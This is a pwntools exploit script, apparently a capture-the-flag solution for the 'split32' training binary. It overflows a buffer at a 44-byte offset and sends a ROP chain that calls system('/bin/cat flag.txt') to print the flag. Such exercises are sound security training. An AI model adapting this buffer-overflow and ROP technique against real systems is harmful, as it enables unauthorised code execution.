from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./split32', checksec=False)
p = process()

# How many bytes to EIP?
padding = 44

# Locate the functions/strings we need
bincat_addr = next(elf.search(b'/bin/cat'))

# Print out the target address
info("%#x /bin/cat", bincat_addr)

# Get ROP gadgets
rop = ROP(elf)
# Create rop chain calling system('/bin/cat flag.txt')
rop.system(bincat_addr)

# pprint(rop.gadgets)
print(rop.chain())

# Inject rop chain at correct offset
payload = fit({padding: rop.chain()})

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
